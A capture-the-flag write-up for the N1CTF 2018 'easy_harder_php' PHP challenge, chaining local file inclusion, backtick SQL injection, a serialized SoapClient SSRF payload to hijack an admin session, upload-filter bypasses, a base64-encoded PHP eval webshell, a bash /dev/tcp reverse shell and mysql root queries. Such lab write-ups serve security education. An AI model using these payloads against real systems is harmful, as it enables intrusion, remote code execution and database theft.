### References

- [@wupco, N1CTF Easy&&Hard Php Writeup, 2018-03-13](https://xz.aliyun.com/t/2148)
- [@Junay, N1CTF easy_harder_php预期解法, 2018-03-14](https://delcoding.github.io/2018/03/n1ctf-easy-harder-php1/)

1.Scan the dir:

```tex
❯❯ py .\dirsearch.py -u http://192.168.200.129 -e php -x 404,403
[17:29:40] Starting:
[17:29:47] 200 -    0B  - /config.php
[17:29:47] 200 -    5KB - /config.php~
[17:29:49] 301 -  315B  - /img  ->  http://192.168.200.129/img/
[17:29:49] 302 -    0B  - /index.php  ->  index.php?action=login
[17:29:49] 302 -    0B  - /index.php/login/  ->  index.php?action=login
[17:29:49] 200 -  168B  - /index.php~
[17:29:53] 301 -  318B  - /static  ->  http://192.168.200.129/static/
[17:29:54] 200 -    0B  - /user.php
[17:29:55] 301 -  317B  - /views  ->  http://192.168.200.129/views/
```

We can find some backup files left by editor, and the `views` directory list all other source codes. It's time to review the code.

BTW, the `index.php?action=login` looks like there is a LFI:

```tex
index.php?action=../../../../../../etc/passwd
```

2.`index.php` included `user.php`, `user.php` included `config.php`, and in `config.php`:

```php
function addsla_all() {
    if (!get_magic_quotes_gpc()) {
        if (!empty($_GET)) {
            $_GET  = addslashes_deep($_GET);
        }
        if (!empty($_POST)) {
            $_POST = addslashes_deep($_POST);
        }
        $_COOKIE   = addslashes_deep($_COOKIE);
        $_REQUEST  = addslashes_deep($_REQUEST);
    }
}
addsla_all();
```

It processed all the input parameters in `addslashes()`. In `Db` class we can find some database info such as database name is nu1lctf. The most interesting is its `insert` function:

```php
public function insert($columns, $table, $values) {
    $column = $this->get_column($columns);
    $value = '(' . preg_replace('/`([^`,]+)`/', '\'${1}\'', $this->get_column($values)) . ')';
    $sql = 'insert into '.$table.'('.$column.') values '.$value;
    $result = $this->conn->query($sql);
    return $result;
}

private function get_column($columns) {
    if(is_array($columns))
        $column = ' `' . implode('`,`', $columns) . '` ';
    else
        $column = ' `' . $columns . '` ';
    return $column;
}
```

The `preg_replace` does some work like:

```tex
`xxxx`  =>  'xxxx'
```

So it brings an opportunity for SQL injection.

3.Search where the `insert` function is called, we can find `register` function and `publish` function in `user.php`.

By reading the `register` function roughly, The 'username' parameter is handled by the `check_username` function and the 'password' parameter is handled by the `md5` function:

```php
public function check_username($username) {
    if(preg_match('/[^a-zA-Z0-9_]/is',$username) or strlen($username)<3 or strlen($username)>20)
        return false;
```

So it looks like there's no way to use SQL injection here, then we can read the `publish` function code.

Fortunately, the 'signature' parameter here seems to have insert the database without any filtering:

```php
function publish() {
    ...
    if(isset($_POST['signature']) && isset($_POST['mood'])) {
        $mood = addslashes(serialize(new Mood((int)$_POST['mood'], get_ip())));
        $db = new Db();
        @$ret = $db->insert(array('userid','username','signature','mood'),'ctf_user_signature',array($this->userid,$this->username,$_POST['signature'],$mood));
        ...
    }
    ...
}
```

In order to use the publish function, we need to register an account and log in. But the CAPTCHA is a bit outrageous, we need write scripts to solve this problem :(

4.After logging in with the `captch.py` script, go to publish page to test SQL injection directly.

```tex
Request:
    signature=1`&mood=1
Response:
    alert('something error');
    self.location='index.php?action=publish';

Request:
    signature=1`,1)%23&mood=1
Response:
    alert('ok');
    self.location='index.php?action=index';

Request:
    signature=1`,if(1=1,sleep(1),1))%23&mood=1
Response:
    alert('ok');
    self.location='index.php?action=index';
```

So here is a time based blind injection, and the `user.php` have some useful info to help us injection:

```php
@$ret = $db->select(array('id','username','ip','is_admin','allow_diff_ip'),'ctf_users',"username = '$username' and password = '$password' limit 1");

@$ret = $db->insert(array('username','password','ip','is_admin','allow_diff_ip'),'ctf_users',array($username,$password,get_ip(),'0','1'));
```

The table name is `ctf_users`, we need the `password` column and the `is_admin` column can determine if the username is administrator.

Writing a script to inject gives the admin password hash:

![](https://i.imgur.com/KjjNPZB.png)

But we still can't login with the admin account, the hint is:

```tex
You can only login at the usual address
```

And by injection, we can also know that the `allow_diff_ip` column of the admin account is 0, `ip` column is 127.0.0.1 which means we need SSRF.

5.Review the `publish` function above, This line of code caught my eye:

```php
$mood = addslashes(serialize(new Mood((int)$_POST['mood'], get_ip())));
```

Since there is a `serialize` operation, somewhere must be an `unserialize`. It can be found through search, in `showmess` function:

```php
function showmess() {
    if($this->is_admin == 0) {
        //id,sig,mood,ip,country,subtime
        $db = new Db();
        @$ret = $db->select(array('username','signature','mood','id'),'ctf_user_signature',"userid = $this->userid order by id desc");
        if($ret) {
            $data = array();
            while ($row = $ret->fetch_row()) {
                $sig = $row[1];
                $mood = unserialize($row[2]);    // Look here!
                $country = $mood->getcountry();  // May trigger __call magic function
                ...
            }
            $data = json_encode(array('code'=>0,'data'=>$data));
            return $data;
        } else return false;
    } else {...}
}
```

It seems to cause an unserialization vul due to SQL injection.

```tex
a`,{serialize object});#
```

We can't find a class that can be used. However, in phpinfo page we can find:

```tex
Soap Client => enabled
Soap Server => enabled
```

So we can immediately think of the `SoapClient` class triggering SSRF. Use the `poc.php` generate poc: (remember to change the code parameter)

```php
a`,0x4f3a31303a22536f6170436c69656e74223a353a7b733a333a22757269223b733a343a2274657374223b733a383a226c6f636174696f6e223b733a33393a22687474703a2f2f3132372e302e302e312f696e6465782e7068703f616374696f6e3d6c6f67696e223b733a31353a225f73747265616d5f636f6e74657874223b693a303b733a31313a225f757365725f6167656e74223b733a3138333a22746573740d0a436f6e74656e742d547970653a206170706c69636174696f6e2f782d7777772d666f726d2d75726c656e636f6465640d0a582d466f727761726465642d466f723a203132372e302e302e310d0a436f6f6b69653a205048505345535349443d74686973697361646d696e0d0a436f6e74656e742d4c656e6774683a2034370d0a0d0a757365726e616d653d61646d696e2670617373776f72643d6e75316c61646d696e26636f64653d4d634f7555477438223b733a31333a225f736f61705f76657273696f6e223b693a313b7d);#
```

After submited, when the page location back to `index` it will trigger the `showmess` function and causing SSRF.

Then we just need to change the `PHPSESSID` to `thisisadmin`, now we are admin and we can upload files!

6.In `config.php`, the `upload` function detecting if an uploaded image contains content `<?php`:

```php
function upload($file) {
    $file_size  = $file['size'];
    if($file_size>2*1024*1024) {...}

    $file_type = $file['type'];
    if($file_type!="image/jpeg" && $file_type!='image/pjpeg') {...}

    if(is_uploaded_file($file['tmp_name'])) {
        $uploaded_file = $file['tmp_name'];
        $user_path =  "/app/adminpic";
        ...
        $move_to_file = $user_path."/".$file_true_name;
        ...
            if(stripos(file_get_contents($move_to_file),'<?php')>=0)
                system('sh /home/nu1lctf/clean_danger.sh');
        ...
    }
}
```

And we can use the LFI mentioned at the beginning to see the contents of `clean_danger.sh`:

```tex
index.php?action=../../../../../../../home/nu1lctf/clean_danger.sh

cd /app/adminpic/
rm *.jpg
```

we need to bypass it :) @wupco provided two ideas to bypass:

- Using a feature of commands of linux
  - create a file like `-xaaaa.jpg`
  - We could not delete it by `rm *` or `rm *.jpg` except `rm -r adminpic/` or `rm ./-*.jpg`
- Using short tags
  - PHP [Manual](https://www.php.net/manual/en/ini.core.php#ini.short-open-tag) mentions the **`<?=`**, which is always available since PHP 5.4.0.

And when upload file seccess, we should brute force the filename because:

```php
date_default_timezone_set("PRC");
$file_true_name = $file_true_name.time().rand(1,100).'.jpg';
```

Use python script it's easy to do this:

![](https://i.imgur.com/yc4URZk.png)

shell content:

```php
<?php file_put_contents('poc.php',base64_decode('PD9waHAgQGV2YWwoJF9SRVFVRVNUW2FdKT8+'));?>
```

7.Find the flag after get shell, but dont find flag files. May be stored in the database. And we can find database connection information in `/run.sh`:

```tex
index.php?action=../../../../run.sh

## change root password
mysql -uroot -e "use mysql;UPDATE user SET password=PASSWORD('Nu1Lctf%#~:p') WHERE user='root';FLUSH PRIVILEGES;"
```

Get reverse shell for easy query and get the flag in database:

```tex
bash -c 'exec bash -i &>/dev/tcp/192.168.200.1/9001 <&1'

mysql -uroot -pNu1Lctf%#~:p -se "show databases;"
mysql -uroot -pNu1Lctf%#~:p -se "use flag;show tables;"
mysql -uroot -pNu1Lctf%#~:p -se "use flag;select * from flag;"
```

![](https://i.imgur.com/zEacDEk.png)

